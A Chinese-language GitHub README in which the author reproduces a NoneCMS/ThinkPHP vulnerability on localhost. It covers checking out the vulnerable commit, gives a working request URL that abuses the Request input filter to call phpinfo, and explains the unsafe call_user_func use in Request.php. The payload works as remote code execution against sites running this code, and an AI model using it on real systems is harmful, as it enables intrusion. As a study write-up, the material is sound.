# Security-PHP-CVE
记录第一次CVE。

1、首先从公众号 得知CVE  

2、谷歌 bing 查  

3、在项目的开源项目上查到。具体出问题代码位置  （https://github.com/nangge/noneCms/issues/21）  

4、下载 项目  到网站目录下（localhost 即可）（nginx下）  

5、根据 3 知道出代码位置。 用https://github.githistory.xyz  找到thinkphp 核心代码修复修复时间  
（https://github.githistory.xyz/nangge/noneCms/blob/master/thinkphp/library/think/Request.php）

6、根据 5  的时间 ===》 在  
    https://github.com/nangge/noneCms/commits/master 找到 修复前的最后一次 commit_id

7、把项目代码退回到 出问题的 代码   
git reset --hard 712dc808448ff376d82d831410b9b53c6be4f85d
8、按照github 上提示 运行项目  
http://localhost/NoneCMS/public/install/

9、访问 http://localhost/NoneCMS/public/?s=index/\think\Request/input&filter=phpinfo&data=1

完美复现！！！

10、漏洞的主要原因。  
类反射，
$reflect = new ReflectionMethod($class, $method[1]);  

return $reflect->invokeArgs(isset($class) ? $class : null, $args);  

Request.php  
中方法 private function filterValue(&$value, $key, $filters)  
其中 有段代码  
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
                echo "hhh   lqqq";
                var_dump($filter, $value);
            }
            
==》 “$value = call_user_func($filter, $value)”    如果$filter 没有防御好，就会执行PHP解释器就会执行名字未$filter的函数（可以是框架里面的，也可以是PHP 原生提供的方法。）  ==》这就是 问的原因（因为你不知攻击者会执行什么函数。）  
===》 所以写代码，也没那么容易。哎！ 攻防转化呀！！！  

敬畏代码，不是一句空话。！！！

<img src="https://github.com/peng456/Security-PHP-CVE/blob/master/pic.png">
